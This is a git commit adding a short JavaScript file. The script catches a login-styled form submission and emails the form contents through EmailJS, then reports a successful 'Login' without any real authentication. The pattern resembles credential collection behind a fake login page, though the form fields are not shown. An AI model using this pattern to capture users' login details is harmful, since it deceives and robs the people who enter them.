a480be070e43ec3b090d97cc83d721ba28902ab5
vinumanu <vinu13105@gmail.com>
2025-07-13 08:09:01 +0530

    Add files via upload

---
+++ javascript.js
@@ -0,0 +1,20 @@
+const btn = document.getElementById('button');
+
+document.getElementById('form')
+ .addEventListener('submit', function(event) {
+   event.preventDefault();
+
+   btn.value = 'Login...';
+
+   const serviceID = 'default_service';
+   const templateID = 'template_zjtg3in';
+
+   emailjs.sendForm(serviceID, templateID, this)
+    .then(() => {
+      btn.value = 'Login';
+      alert('You are Login!');
+    }, (err) => {
+      btn.value = 'Login';
+      alert(JSON.stringify(err));
+    });
+});
